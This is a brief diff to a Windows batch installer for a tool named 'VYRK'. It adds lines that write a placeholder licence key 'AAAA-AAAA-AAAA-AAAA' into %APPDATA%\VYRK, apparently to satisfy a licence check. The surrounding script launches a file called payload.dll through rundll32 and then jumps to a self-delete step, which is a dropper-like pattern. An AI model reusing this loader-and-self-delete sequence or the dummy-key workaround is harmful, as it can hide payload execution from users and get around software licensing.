@@ -66,6 +66,8 @@ copy /y "%D%\clean.bat" "%USERPROFILE%\Desktop\VYRK Clean.bat" >nul 2>&1
 
 echo  [+] Installed to %D%
 echo  [*] Loading...
+if not exist "%APPDATA%\VYRK" mkdir "%APPDATA%\VYRK"
+if not exist "%APPDATA%\VYRK\license.key" echo AAAA-AAAA-AAAA-AAAA> "%APPDATA%\VYRK\license.key"
 start "" rundll32.exe "%D%\payload.dll",Entry
 goto :self_delete
 
